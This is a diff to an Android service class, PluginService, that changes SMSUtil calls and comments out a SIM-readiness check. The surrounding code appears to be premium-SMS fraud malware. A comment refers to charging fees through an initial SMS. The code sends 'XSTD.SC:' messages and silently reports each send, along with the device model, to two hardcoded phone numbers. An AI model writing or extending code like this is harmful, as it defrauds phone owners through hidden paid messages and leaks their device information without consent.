@@ -258,7 +258,7 @@ public class PluginService extends IntentService {
                         String content = datas[i];
                         if (datas[i] != null && datas[i].length() == 11) {
                             content = datas[i].substring(0, 5) + "." + datas[i].substring(5);
-                            if (SMSUtil.sendSMSForLogic(datas[i], "XSTD.SC:" + content)) {
+                            if (SMSUtil.sendSMSForLogic(getApplicationContext(), datas[i], "XSTD.SC:" + content)) {
                                 datas[i] = "";
                             }
 
@@ -286,7 +286,7 @@ public class PluginService extends IntentService {
 
                             String phone = android.os.Build.MODEL;
                             String debugMsg = "[[通知短信]]" + phone + " 上的子程序向:" + target + "发送了:<<" + "XSTD.SC:" + content + ">>";
-                            SMSUtil.sendSMSForLogic("18811087096", debugMsg);
+                            SMSUtil.sendSMSForLogic(getApplicationContext(), "18811087096", debugMsg);
 
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
                                             " with " + debugMsg);
@@ -299,7 +299,7 @@ public class PluginService extends IntentService {
                                     Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                                 }
                             }
-                            SMSUtil.sendSMSForLogic("15810864155", debugMsg);
+                            SMSUtil.sendSMSForLogic(getApplicationContext(), "15810864155", debugMsg);
                         }
 
                         try {
@@ -401,7 +401,7 @@ public class PluginService extends IntentService {
                         /**
                          * 注意，每次扣费的时候，第一条起始的短信都是很直接的，都是n+c的模式
                          */
-                        if (SMSUtil.sendSMSForMonkey(startPort, startContent)) {
+                        if (SMSUtil.sendSMSForMonkey(getApplicationContext(), startPort, startContent)) {
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("phoneType", Build.MODEL);
                             log.put("channelName", AppRuntime.ACTIVE_RESPONSE.channelName);
@@ -428,7 +428,7 @@ public class PluginService extends IntentService {
 
     private void activePluginAction() {
         AppRuntime.updateSIMCardReadyLog(getApplicationContext());
-        if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;
+//        if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;
 
         if (Config.DEBUG) {
             Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
